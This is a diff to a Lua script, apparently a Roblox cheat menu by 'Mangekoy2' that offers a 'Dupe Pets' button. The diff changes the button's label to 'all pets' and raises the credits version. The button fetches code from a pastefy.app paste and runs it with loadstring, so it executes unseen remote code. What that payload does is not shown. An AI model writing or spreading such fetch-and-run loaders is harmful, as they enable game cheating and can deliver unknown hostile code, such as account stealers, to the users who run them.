@@ -9,11 +9,11 @@ local MainTab = Window:NewTab("Main")
 local PetsSection = MainTab:NewSection("Dupe Pets")
 
 -- Кнопка для дублирования питомцев
-PetsSection:NewButton("Dupe", "Dragon Fly, Raccoon, Red Fox", function()
+PetsSection:NewButton("all pets", function()
     -- Запуск вашего скрипта при нажатии
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
 -- Вкладка с автором
 local CreditsTab = Window:NewTab("Credits")
-CreditsTab:NewSection("Made By Mangekoy2 | v1.0")
+CreditsTab:NewSection("Made By Mangekoy2 | v2.0")
